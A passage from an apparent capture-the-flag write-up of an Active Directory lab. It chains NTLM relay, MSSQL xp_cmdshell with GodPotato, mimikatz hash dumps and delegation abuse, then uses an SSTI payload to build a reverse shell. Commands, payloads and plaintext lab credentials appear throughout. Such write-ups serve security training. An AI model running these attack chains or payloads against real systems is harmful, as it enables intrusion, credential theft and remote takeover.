We cannot log in as adrian.wong, so this stays theory for now. Going back to enumerating FS01, we find the following file:

```bash
PS C:\Users\adrian.wong\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type .\ServerRemoteHost_history.txt
sqlcmd -S sql01.dev.zenith.rv -U "sql-dev-372f" -P "PraxLFgbzBhH" -Q "SELECT @@VERSION;"
```

A password on the command line, preserved forever by PSReadLine. These history files are a reliable source of credentials on any host where administrators actually work. We can also check whether the machine is Azure AD joined with `dsregcmd /status`:

{% image42 %}

### SQL01 - MSSQL Enumeration

So we have this command from the PowerShell history:

```bash
sqlcmd -S sql01.dev.zenith.rv -U "sql-dev-372f" -P "PraxLFgbzBhH" -Q "SELECT @@VERSION;"
```

So let's try to authenticate to the MSSQL instance:

{% image43 %}

→ NTLM theft:

{% image44 %}

→ NTLM relay to FS01, but nothing works. The coerced authentication reaches us, yet the relay fails.

→ LDAP Signing is not enforced:

```bash
➜  the_range_village netexec ldap hosts.txt -u 'sql-dev-372f' -p 'PraxLFgbzBhH' -M ldap-checker
LDAP        10.5.10.13      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:dev.zenith.rv)
LDAP        10.5.10.13      389    DC02             [+] dev.zenith.rv\sql-dev-372f:PraxLFgbzBhH
LDAP-CHE... 10.5.10.13      389    DC02             LDAP signing NOT enforced
```

→ Running exploit suggester:

```bash
 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
 2   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
 4   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
```

### NTLM Relay via the Jump Server (Flag 3)

Now, remembering the `redirect.sh` script - we can abuse it to relay to the SQL server. The reason the earlier relay failed is routing: SQL01 cannot reach our attacking machine directly, but it can reach the jump server, and the jump server can reach us. `redirect.sh` turns the jump host into the missing hop.

{% image45 %}

→ On our machine we started the socks relay: `/home/kali/.local/share/pipx/venvs/impacket/bin/ntlmrelayx.py -t smb://10.5.10.8 -smb2support -socks -debug`

And on the ssh server at `10.5.5.4` we redirected the traffic: `sudo /opt/redirect.sh 445 10.8.0.4 445`

So the attack path is the following:

1. you coerce authentication from `SQL01` to `jmp`
2. forward `jmp` to `you`

If you don't specify a UNC path, Windows assumes that it's a public share so it doesn't send any credentials at all, so we need to do: `xp_dirtree \\10.5.5.4\a`

And we will get the following message when we relayed:

{% image46 %}

And then we need to enumerate the shares:

→ Command: `sudo proxychains4 -f /etc/proxychains4.conf -q netexec smb FS01.dev.zenith.rv -u 'svc_sql' -p '' -d 'dev' --shares`

{% image47 %}

Or use impacket:

```bash
➜  the_range_village sudo proxychains4 -f /etc/proxychains4.conf -q impacket-smbclient dev/svc_sql@10.5.10.8 -no-pass -target-ip 10.5.10.8
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
CommonSvcHome$
Ingest
IPC$
Ops
Public
SQLControl$
TX_{dcd6c76b-a180-4cc5-93be-ecce1519dbf5}$
zenith.archive
```

`SQLControl$` is new - a share that neither of our previous accounts could see.

Or use the interactive module: `ntlmrelayx.py -t smb://10.5.10.8 -smb2support -i -debug`

{% image48 %}

And connect via `nc`. Inside it we can run `shares` and use the `SQLControl$` share, which contains the following:

{% image49 %}

→ Flag3: `RV{wHo_5a1D_NTlm_R31@y1Ng_w@s_D4@D_c5cfac35441b01cbcd4650a10ae50fec}%`

→ test.ps1 file:

```bash
➜  the_range_village cat test.ps1
$Server   = "sql01.dev.zenith.rv"
$Username = "svc_sqladm"
$Password = 'LiPvcKP5Mj46cHOjb2C8w3hg'

$Query = "CREATE DATABASE DevTest_Internal;"

$FullQuery = @"
EXECUTE AS LOGIN = 'sa';
GO
$Query
GO
REVERT;
"@

sqlcmd -S $Server -U $Username -P $Password -Q $FullQuery%
```

A test script with a hardcoded password, and - more usefully - a working demonstration that this account is allowed to `EXECUTE AS LOGIN = 'sa'`.

### SQL01 - Executing as SA with GodPotato (Flag 4)

Now with this user, and the script confirming the technique, we can execute as SA:

{% image50 %}

And now let's enable `xp_cmdshell` and run some commands:

{% image51 %}

Command execution through MSSQL lands us in the context of the service account, which holds `SeImpersonatePrivilege` - the standard prerequisite for a potato-style local escalation. Using `impacket-smbclient dev.zenith.rv/svc_vdi:'P@ssw0rd1'@FS01.dev.zenith.rv` we will put GodPotato in place to abuse that privilege and create a local administrator account on the machine that we can then connect with:

{% image52 %}

And we can see that we have got local administrator:

{% image53 %}

Now let's create the local admin account and SSH with it onto the machine:

```bash
xp_cmdshell C:\Users\svc_sql\Downloads\potato.exe -cmd "cmd /c net user 0xd1s Password123! /add"
xp_cmdshell C:\Users\svc_sql\Downloads\potato.exe -cmd "cmd /c net localgroup Administrators 0xd1s /add"
```

And we can see that we have access using local auth:

{% image54 %}

And now we can use SSH to connect to the machine: `ssh 0xd1s@SQL01.dev.zenith.rv`

{% image55 %}

→ Flag4: `RV{tR@dI7!oNAL_S4_t0_sy57Em_vEc70rs_2003fb9b62a4cabb880054df430e32d3}`

{% image56 %}

### SQL01 - Delegation Abuse to FS01 (Flag 5)

Local administrator on SQL01 is a means, not an end. What we want from this box is its machine account.

→ netstat enumeration ( trimmed to the established connections; the rest is the usual set of default Windows listeners ):

```bash
PS C:\Users\Administrator\Desktop> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       6052
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       468
  TCP    10.5.10.14:22          10.5.10.8:55209        ESTABLISHED     2300
  TCP    10.5.10.14:1433        10.5.10.8:55204        ESTABLISHED     6052
  TCP    10.5.10.14:3389        10.5.5.4:33252         CLOSE_WAIT      468
  TCP    10.5.10.14:60934       10.5.10.8:445          ESTABLISHED     4
  TCP    10.5.10.14:60935       10.5.10.8:445          ESTABLISHED     4
  TCP    10.5.10.14:60936       10.5.10.8:445          ESTABLISHED     4
  TCP    10.5.10.14:60937       10.5.10.8:445          ESTABLISHED     4
  TCP    10.5.10.14:60952       10.5.10.13:135         TIME_WAIT       0
  TCP    10.5.10.14:60953       10.5.10.13:49669       TIME_WAIT       0
```

→ Allowing firewall outbound traffic:

```bash
PS C:\Users> Set-NetFirewallProfile -Profile Domain,Private,Public -DefaultOutboundAction Allow
PS C:\Users> Get-NetFirewallProfile | Select Name, DefaultOutboundAction

Name    DefaultOutboundAction
----    ---------------------
Domain                  Allow
Private                 Allow
Public                  Allow
```

→ Transferring mimikatz.exe via scp:

{% image57 %}

→ Output:

```bash
msv :
 [00000003] Primary
 * Username : SQL01$
 * Domain   : DEV
 * NTLM     : 8c4932e605f7ab31582bb234fb6ca444
 * SHA1     : 48efbb200656cdc738b7365ec5fbbdbb7aa16e05
* DPAPI    : 48efbb200656cdc738b7365ec5fbbdbb

msv :
 [00000003] Primary
 * Username : svc_sql
 * Domain   : DEV
 * NTLM     : c8137934841c374de1afb1507dbba46a
 * SHA1     : 2044ee5bd1c81dea0afd74e5edc9cc7490c1feae
 * DPAPI    : 23feb5dd0624f713a96b24359bb50bcd
```

`SQL01$` is exactly what we were after.

→ Rubeus Triage:

```bash
PS C:\Users\0xd1s\Downloads> .\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x66d51e5

 ------------------------------------------------------------------------------------------------------
 | LUID     | UserName                | Service                               | EndTime               |
 ------------------------------------------------------------------------------------------------------
 | 0x117979 | svc_sql @ DEV.ZENITH.RV | krbtgt/DEV.ZENITH.RV                  | 3/18/2026 11:47:05 PM |
 | 0x117979 | svc_sql @ DEV.ZENITH.RV | ProtectedStorage/dc02.dev.zenith.rv   | 3/18/2026 11:47:05 PM |
 | 0x117979 | svc_sql @ DEV.ZENITH.RV | cifs/dc02.dev.zenith.rv               | 3/18/2026 11:47:05 PM |
 | 0x117979 | svc_sql @ DEV.ZENITH.RV | LDAP/dc02.dev.zenith.rv/dev.zenith.rv | 3/18/2026 11:47:05 PM |
 | 0x3e4    | sql01$ @ DEV.ZENITH.RV  | krbtgt/DEV.ZENITH.RV                  | 3/29/2026 3:12:09 AM  |
 | 0x3e4    | sql01$ @ DEV.ZENITH.RV  | cifs/dc02.dev.zenith.rv               | 3/29/2026 3:12:09 AM  |
 | 0x3e4    | sql01$ @ DEV.ZENITH.RV  | LDAP/dc02.dev.zenith.rv/dev.zenith.rv | 3/18/2026 11:41:53 PM |
 | 0x137141 | svc_sql @ DEV.ZENITH.RV | krbtgt/DEV.ZENITH.RV                  | 3/25/2026 1:47:08 PM  |
 | 0x3e7    | sql01$ @ DEV.ZENITH.RV  | krbtgt/DEV.ZENITH.RV                  | 3/29/2026 5:26:31 AM  |
 | 0x3e7    | sql01$ @ DEV.ZENITH.RV  | cifs/dc02.dev.zenith.rv/dev.zenith.rv | 3/29/2026 5:26:31 AM  |
 | 0x3e7    | sql01$ @ DEV.ZENITH.RV  | LDAP/dc02.dev.zenith.rv/dev.zenith.rv | 3/29/2026 5:26:31 AM  |
 | 0x3e7    | sql01$ @ DEV.ZENITH.RV  | SQL01$                                | 3/29/2026 5:26:31 AM  |
 | 0x3e7    | sql01$ @ DEV.ZENITH.RV  | cifs/dc02.dev.zenith.rv               | 3/28/2026 10:07:27 AM |
 | 0x3e7    | sql01$ @ DEV.ZENITH.RV  | LDAP/dc02.dev.zenith.rv               | 3/16/2026 4:47:45 AM  |
 | 0x3e7    | sql01$ @ DEV.ZENITH.RV  | sql01$                                | 3/29/2026 12:31:53 AM |
 | 0x3e7    | sql01$ @ DEV.ZENITH.RV  | sql01$                                | 3/29/2026 12:29:18 AM |
 ------------------------------------------------------------------------------------------------------
```

If we look at the BloodHound data we can see the following:

{% image58 %}

SQL01 is trusted to delegate to FS01, so we can abuse this using `impacket-getST` - asking for a ticket to FS01's `cifs` service while impersonating the domain Administrator, using nothing but SQL01's machine account hash:

```bash
➜  the_range_village impacket-getST -spn "cifs/FS01.DEV.ZENITH.RV" -impersonate "Administrator" "dev.zenith.rv/SQL01$" -hashes :8c4932e605f7ab31582bb234fb6ca444
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_FS01.DEV.ZENITH.RV@DEV.ZENITH.RV.ccache
```

Now with this CCACHE we can connect to the FS01 machine as Administrator:

{% image59 %}

→ Viewing the ticket:

{% image60 %}

→ Using the ccache:

{% image61 %}

→ Executing commands:

{% image62 %}

→ Creating a local administrator account:

```bash
C:\>net user 0xd1s Password123! /add
The command completed successfully.

C:\>net localgroup Administrators 0xd1s /add
The command completed successfully.
```

And now we can authenticate via SSH:

{% image63 %}

→ Flag5: `RV{4_$1MPle_a7tack_tO_W4Rm_d0Wn_fd55f8472a83ccdde92545dbf0ef737b}`

{% image64 %}

### FS01 - Enumeration as Administrator (jess.lim's Credentials)

Full administrative access to FS01 gives us the profiles of everyone who has ever logged into it.

Inside the Users folder we can see the following:

```bash
PS C:\Users> dir

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/29/2026   1:26 AM                0xd1s
d-----         3/18/2026   2:03 PM                Administrator
d-----         3/18/2026   8:02 PM                adrian.wong
d-----         3/15/2026   6:42 PM                async_adm
d-----         3/18/2026   1:48 PM                jess.lim
d-----         3/15/2026   6:44 PM                localuser
d-r---         3/14/2026   7:05 PM                Public
d-----         3/22/2026   9:59 PM                sql-dev-372f
```

The user `jess.lim` is inside the `SERVICE ADMINS` group, which is the group allowed to authenticate to the web application on WEB01 - the exact gate that blocked us earlier.

→ Mimikatz:

```bash
        msv :
         [00000003] Primary
         * Username : FS01$
         * Domain   : DEV
         * NTLM     : 713044c19ef2bd125ae64010b0a567ba
         * SHA1     : 17191b6499a6d0ddf6ab59b9306dae532c7df3e4
         * DPAPI    : 17191b6499a6d0ddf6ab59b9306dae53
```

→ Rubeus:

```bash
PS C:\Users\0xd1s\Downloads> .\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x68a825a

 -----------------------------------------------------------------------------------------------------------
 | LUID      | UserName                    | Service                               | EndTime               |
 -----------------------------------------------------------------------------------------------------------
 | 0x2cf804e | adrian.wong @ DEV.ZENITH.RV | krbtgt/DEV.ZENITH.RV                  | 3/29/2026 7:19:22 AM  |
 | 0x2cf804e | adrian.wong @ DEV.ZENITH.RV | ldap/dc02.dev.zenith.rv/dev.zenith.rv | 3/23/2026 5:05:08 AM  |
 | 0x2cf804e | adrian.wong @ DEV.ZENITH.RV | LDAP/dc02.dev.zenith.rv               | 3/23/2026 5:05:08 AM  |
 | 0x39bf666 | adrian.wong @ DEV.ZENITH.RV | krbtgt/DEV.ZENITH.RV                  | 3/29/2026 6:35:27 AM  |
 | 0x39bf666 | adrian.wong @ DEV.ZENITH.RV | LDAP/dc02.dev.zenith.rv/dev.zenith.rv | 3/24/2026 9:36:07 AM  |
 | 0x38fa5b1 | adrian.wong @ DEV.ZENITH.RV | krbtgt/DEV.ZENITH.RV                  | 3/29/2026 5:35:32 AM  |
 | 0x677a135 | adrian.wong @ DEV.ZENITH.RV | krbtgt/DEV.ZENITH.RV                  | 3/29/2026 8:31:21 AM  |
 | 0x3b256f0 | adrian.wong @ DEV.ZENITH.RV | krbtgt/DEV.ZENITH.RV                  | 3/29/2026 10:08:00 AM |
 | 0x3e4     | fs01$ @ DEV.ZENITH.RV       | krbtgt/DEV.ZENITH.RV                  | 3/29/2026 3:12:09 AM  |
 | 0x3e4     | fs01$ @ DEV.ZENITH.RV       | cifs/dc02.dev.zenith.rv               | 3/29/2026 3:12:09 AM  |
 | 0x3e7     | fs01$ @ DEV.ZENITH.RV       | krbtgt/DEV.ZENITH.RV                  | 3/29/2026 6:08:02 AM  |
 | 0x3e7     | fs01$ @ DEV.ZENITH.RV       | cifs/dc02.dev.zenith.rv               | 3/29/2026 6:08:02 AM  |
 | 0x3e7     | fs01$ @ DEV.ZENITH.RV       | cifs/dc02.dev.zenith.rv/dev.zenith.rv | 3/29/2026 6:08:02 AM  |
 | 0x3e7     | fs01$ @ DEV.ZENITH.RV       | FS01$                                 | 3/29/2026 6:08:02 AM  |
 | 0x3e7     | fs01$ @ DEV.ZENITH.RV       | ldap/dc02.dev.zenith.rv/dev.zenith.rv | 3/29/2026 6:08:02 AM  |
 | 0x3e7     | fs01$ @ DEV.ZENITH.RV       | LDAP/dc02.dev.zenith.rv               | 3/16/2026 4:47:45 AM  |
 | 0x3e7     | fs01$ @ DEV.ZENITH.RV       | fs01$                                 | 3/28/2026 10:46:16 PM |
 -----------------------------------------------------------------------------------------------------------
```

Plenty of adrian.wong tickets, but nothing for `async_adm` or `jess.lim` - no shortcut there.

→ Enumerating token impersonation:

{% image65 %}

But using a local binary doesn't show that we can impersonate `async_adm` ( output trimmed to the non-SYSTEM processes - the omitted lines are all default `svchost.exe` instances ):

```bash
PS C:\Users\0xd1s\Downloads> .\irs.exe list
[winlogon.exe                    ] [PROCESS: 696  ] [SESSION: 1 ] [TYPE: Primary] [System   ] [USER: NT AUTHORITY\SYSTEM         ]
[lsass.exe                       ] [PROCESS: 748  ] [SESSION: 0 ] [TYPE: Primary] [System   ] [USER: NT AUTHORITY\SYSTEM         ]
[conhost.exe                     ] [PROCESS: 4984 ] [SESSION: 0 ] [TYPE: Primary] [Medium   ] [USER: DEV\adrian.wong             ]
[conhost.exe                     ] [PROCESS: 4044 ] [SESSION: 0 ] [TYPE: Primary] [Medium   ] [USER: DEV\adrian.wong             ]
[conhost.exe                     ] [PROCESS: 3440 ] [SESSION: 0 ] [TYPE: Primary] [Medium   ] [USER: DEV\adrian.wong             ]
[conhost.exe                     ] [PROCESS: 5016 ] [SESSION: 0 ] [TYPE: Primary] [Medium   ] [USER: DEV\adrian.wong             ]
[sshd-session.exe                ] [PROCESS: 3792 ] [SESSION: 0 ] [TYPE: Primary] [Medium   ] [USER: DEV\adrian.wong             ]
[conhost.exe                     ] [PROCESS: 2976 ] [SESSION: 0 ] [TYPE: Primary] [Medium   ] [USER: DEV\adrian.wong             ]
[powershell.exe                  ] [PROCESS: 4496 ] [SESSION: 0 ] [TYPE: Primary] [Medium   ] [USER: DEV\adrian.wong             ]
[agent.exe                       ] [PROCESS: 4020 ] [SESSION: 0 ] [TYPE: Primary] [Medium   ] [USER: DEV\adrian.wong             ]
[sshd-session.exe                ] [PROCESS: 3160 ] [SESSION: 0 ] [TYPE: Primary] [High     ] [USER: FS01\0xd1s                  ]
[conhost.exe                     ] [PROCESS: 4940 ] [SESSION: 0 ] [TYPE: Primary] [High     ] [USER: FS01\0xd1s                  ]
[powershell.exe                  ] [PROCESS: 3224 ] [SESSION: 0 ] [TYPE: Primary] [High     ] [USER: FS01\0xd1s                  ]
[irs.exe                         ] [PROCESS: 1044 ] [SESSION: 0 ] [TYPE: Primary] [High     ] [USER: FS01\0xd1s                  ]
```

I also compiled the `SharpImpersonation.exe` tool and it shows the same picture:

```bash
PS C:\Users\0xd1s\Downloads> .\SharpImpersonation.exe list wmi

   _____ __                     ____                                                 __  _
  / ___// /_  ____ __________  /  _/___ ___  ____  ___  ______________  ____  ____ _/ /_(_)___  ____
  \__ \/ __ \/ __ `/ ___/ __ \ / // __ `__ \/ __ \/ _ \/ ___/ ___/ __ \/ __ \/ __ `/ __/ / __ \/ __ \
 ___/ / / / / /_/ / /  / /_/ // // / / / / / /_/ /  __/ /  (__  ) /_/ / / / / /_/ / /_/ / /_/ / / / /
/____/_/ /_/\__,_/_/  / .___/___/_/ /_/ /_/ .___/\___/_/  /____/\____/_/ /_/\__,_/\__/_/\____/_/ /_/
                     /_/                 /_/
                                            By: S3cur3Th1sSh1t, @ShitSecure

[*] Examining 92 processes
UserName                      ProcessID
--------                      ---------
\                             0
NT AUTHORITY\SYSTEM           148
FONT DRIVER HOST\UMFD-1       908
FONT DRIVER HOST\UMFD-0       916
NT AUTHORITY\NETWORK SERVICE  996
NT AUTHORITY\LOCAL SERVICE    780
WINDOW MANAGER\DWM-1          1436
DEV\ADRIAN.WONG               4984
FS01\0XD1S                    3160
```

Only adrian.wong - whose credentials we already have - and ourselves. This route is a dead end, so the profiles on disk are the more promising lead.

→ network enumeration ( trimmed to the established connections ):

```bash
PS C:\> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    10.5.10.8:22           10.5.5.4:35264         ESTABLISHED     788
  TCP    10.5.10.8:22           10.5.10.8:55298        ESTABLISHED     788
  TCP    10.5.10.8:445          10.5.10.8:55353        ESTABLISHED     4
  TCP    10.5.10.8:55105        10.5.5.4:11601         ESTABLISHED     4020
  TCP    10.5.10.8:55204        10.5.10.14:1433        ESTABLISHED     4020
  TCP    10.5.10.8:55298        10.5.10.8:22           ESTABLISHED     4020
  TCP    10.5.10.8:55353        10.5.10.8:445          ESTABLISHED     4020
```

Our own Ligolo agent on port 11601 and the MSSQL connection to SQL01 are both visible here, which is a good reminder of how loud a tunnel looks to anyone reading `netstat`.

Doing a `tree /f` we can see that inside the `jess.lim` profile we have an interesting file:

```bash
├───jess.lim
│   ├───Desktop
│   │       tx_interact.py
│   │
│   ├───Documents
│   ├───Downloads
│   ├───Favorites
│   ├───Links
│   ├───Music
│   ├───Pictures
│   ├───Saved Games
│   └───Videos
```

And inside it we can find the credentials for the user:

{% image66 %}

So we can log in to the web application with those credentials - the account we needed all along was sitting in a Python script on someone's desktop:

```bash
endpoint, username, password = (
    "https://web01.dev.zenith.rv",
    "jess.lim",
    "oy1q9SLj4D2m",
)
```

## WEB01: SSTI to Domain Admin

### WEB01 - Login and the Self-Write Primitive

{% image67 %}

Now let's check if we can modify our own personal information, the same way we could as adrian.wong: `impacket-dacledit -action read -target 'jess.lim' dev.zenith.rv/jess.lim:'oy1q9SLj4D2m'`

And we can see that jess.lim can modify their own personal information:

```bash
[*]   ACE[16] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Personal-Information (77b5b886-944a-11d1-aebd-0000f80367c1)
[*]     Trustee (SID)             : Principal Self (S-1-5-10)
```

This is the missing half of the primitive we identified earlier: we can write our own `mobile` attribute, and now we can also log into the application that renders it. Let's confirm the write with bloodyad:

{% image68 %}

→ Modifying the value:

```bash
bloodyad -d dev.zenith.rv -u jess.lim -p 'oy1q9SLj4D2m' -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 set object "jess.lim" mobile -v "123456"
```

{% image69 %}

→ Validating the modification:

{% image70 %}

### WEB01 - SSTI to Remote Code Execution (Flag 6)

Now here let's inject an SSTI payload, `{{7*7}}`:

{% image71 %}

And we can see that it successfully worked. Using the following payload we can see that we have RCE: `{{lipsum.__globals__['os'].popen('id').read()}}`

{% image72 %}

But we hit a limit on the attribute value length, which caps how much output we can read back and how long a payload we can send:

{% image73 %}

So we just did a basic `ls -lah` and we found that there are the following files:

```bash
    total 52K
    drwxr-xr-x 4 root root 4.0K Mar 18 13:57 .
    drwxr-xr-x 3 root root 4.0K Mar 18 13:49 ..
    -rwxr-xr-x 1 root root 8.2K Mar 18 13:49 app.py
    -rwxr-xr-x 1 root root 1.9K Mar 18 13:49 cert.pem
    -rwxr-xr-x 1 root root 760 Mar 18 13:49 config.py
    -rwxr-xr-x 1 root root 210 Mar 18 13:49 .env
    -rw-r--r-- 1 root root 71 Mar 18 13:57 flag6.txt
    -rwxr-xr-x 1 root root 3.2K Mar 18 13:49 key.pem
    drwxr-xr-x 2 root root 4.0K Mar 18 13:49 __pycache__
    -rwxr-xr-x 1 root root 65 Mar 18 13:49 requirements.txt
    drwxr-xr-x 2 root root 4.0K Mar 18 13:49 templates
```

→ Flag6: `RV{a_PARTiCU1aRLy_uNU$UAl_sST1_V3cTOR_17c27ed1e4631d83ed540fbe9236c069}`

{% image74 %}

The interesting file is `.env`, which contains the following:

```bash
    FLASK_SECRET="V9VwUy8AE6XKl2W4C34VyYamFmnuafZ6gGpw"
    LDAP_SERVER="ldap://dev.zenith.rv"
    LDAP_USER="CN=TX Runner,CN=Users,DC=dev,DC=zenith,DC=rv"
    LDAP_PASSWORD="KLocjq6X1o9S"
    LDAP_BASE_DN="DC=dev,DC=zenith,DC=rv"
```

The application's LDAP bind password, in the clear. And we can see that we get a hit on the `svc_tx` user:

{% image75 %}

### WEB01 - Reverse Shell as svc_tx

Because of the attribute length limit, we cannot write a reverse shell in one go - so we build the payload up a few characters at a time, appending to a file on disk. Let's take it step by step:

```bash
bloodyad -d dev.zenith.rv -u jess.lim -p 'oy1q9SLj4D2m' -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 set object "jess.lim" mobile -v "{{lipsum.__globals__.os.popen('echo -n \"nc 10\">/tmp/a').read()}}"
[...]
```

{% image76 %}

Now we need to execute the script from /tmp/a: `bloodyad -d dev.zenith.rv -u jess.lim -p 'oy1q9SLj4D2m' -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 set object "jess.lim" mobile -v "{{lipsum.__globals__.os.popen('bash /tmp/a').read()}}"`

And we can see that we have got a reverse shell:

{% image77 %}

The same drip-feed approach, four characters at a time, gets us a full interactive shell written to `/tmp/b`:

```bash
bloodyad -d dev.zenith.rv -u jess.lim -p 'oy1q9SLj4D2m' -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 set object "jess.lim" mobile -v "{{lipsum.__globals__.os.popen('echo -n \"/bin/\">/tmp/b').read()}}"
bloodyad -d dev.zenith.rv -u jess.lim -p 'oy1q9SLj4D2m' -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 set object "jess.lim" mobile -v "{{lipsum.__globals__.os.popen('echo -n \"sh -\">>/tmp/b').read()}}"
bloodyad -d dev.zenith.rv -u jess.lim -p 'oy1q9SLj4D2m' -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 set object "jess.lim" mobile -v "{{lipsum.__globals__.os.popen('echo -n \"i >&\">>/tmp/b').read()}}"
bloodyad -d dev.zenith.rv -u jess.lim -p 'oy1q9SLj4D2m' -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 set object "jess.lim" mobile -v "{{lipsum.__globals__.os.popen('echo -n \" /de\">>/tmp/b').read()}}"
bloodyad -d dev.zenith.rv -u jess.lim -p 'oy1q9SLj4D2m' -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 set object "jess.lim" mobile -v "{{lipsum.__globals__.os.popen('echo -n \"v/tc\">>/tmp/b').read()}}"
bloodyad -d dev.zenith.rv -u jess.lim -p 'oy1q9SLj4D2m' -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 set object "jess.lim" mobile -v "{{lipsum.__globals__.os.popen('echo -n \"p/10\">>/tmp/b').read()}}"
bloodyad -d dev.zenith.rv -u jess.lim -p 'oy1q9SLj4D2m' -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 set object "jess.lim" mobile -v "{{lipsum.__globals__.os.popen('echo -n \".5.1\">>/tmp/b').read()}}"
bloodyad -d dev.zenith.rv -u jess.lim -p 'oy1q9SLj4D2m' -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 set object "jess.lim" mobile -v "{{lipsum.__globals__.os.popen('echo -n \"0.8/\">>/tmp/b').read()}}"
bloodyad -d dev.zenith.rv -u jess.lim -p 'oy1q9SLj4D2m' -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 set object "jess.lim" mobile -v "{{lipsum.__globals__.os.popen('echo -n \"3444\">>/tmp/b').read()}}"
bloodyad -d dev.zenith.rv -u jess.lim -p 'oy1q9SLj4D2m' -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 set object "jess.lim" mobile -v "{{lipsum.__globals__.os.popen('echo -n \"4 0>\">>/tmp/b').read()}}"
bloodyad -d dev.zenith.rv -u jess.lim -p 'oy1q9SLj4D2m' -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 set object "jess.lim" mobile -v "{{lipsum.__globals__.os.popen('echo -n \"&1\">>/tmp/b').read()}}"
bloodyad -d dev.zenith.rv -u jess.lim -p 'oy1q9SLj4D2m' -H DC02.dev.zenith.rv --dc-ip 10.5.10.13 set object "jess.lim" mobile -v "{{lipsum.__globals__.os.popen('bash /tmp/b').read()}}"
```

Using the `sudo -l` command we can see the following:

{% image78 %}

→ network enumeration:

```bash
svc_tx@web01:/opt/tx/app$ ss -antup
ss -antup
Netid       State        Recv-Q       Send-Q             Local Address:Port                Peer Address:Port        Process
udp         UNCONN       0            0                        0.0.0.0:123                      0.0.0.0:*
udp         UNCONN       0            0                           [::]:123                         [::]:*
tcp         LISTEN       0            128                      0.0.0.0:22                       0.0.0.0:*
tcp         LISTEN       0            128                      0.0.0.0:443                      0.0.0.0:*
tcp         ESTAB        0            0                     10.5.10.15:40142                 10.5.10.13:3268
tcp         ESTAB        0            0                     10.5.10.15:53836                  10.5.10.8:34444        users:(("sh",pid=148599,fd=2),("sh",pid=148599,fd=1),("sh",pid=148599,fd=0))
tcp         ESTAB        0            0                     10.5.10.15:41331                 10.5.10.13:389
tcp         ESTAB        0            0                     10.5.10.15:60513                 10.5.10.13:389
tcp         ESTAB        0            0                     10.5.10.15:443                    10.5.10.8:55842
tcp         ESTAB        0            0                     10.5.10.15:37140                 10.5.10.13:389
tcp         LISTEN       0            128                         [::]:22                          [::]:*
```

The multiple LDAP connections to DC02 confirm the app is domain-integrated, which matters shortly.

→ process list ( trimmed to the application and our own shells; the omitted lines are kernel threads and standard systemd units ):

```bash
svc_tx@web01:/opt/tx/app$ ps -aux --forest
ps -aux --forest
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3 167776 13356 ?        Ss   Mar18   0:25 /lib/systemd/systemd --system --deserialize 41 a
root        4555  0.0  0.5  96544 23200 ?        Ss   Mar18   0:02 /usr/sbin/sssd -i --logger=files
root        4556  0.0  0.7 135192 30408 ?        S    Mar18   0:28  \_ /usr/libexec/sssd/sssd_be --domain dev.zenit
root        4557  0.0  1.2 112132 51960 ?        S    Mar18   0:44  \_ /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 -
root        4558  0.0  0.5  86408 23268 ?        S    Mar18   0:13  \_ /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 -
svc_tx     93307  0.2  2.1 298424 86816 ?        Ssl  Mar24  16:06 /usr/bin/python3 /opt/tx/app/app.py
svc_tx    148597  0.0  0.0   2892   972 ?        S    05:25   0:00  \_ /bin/sh -c bash /tmp/b
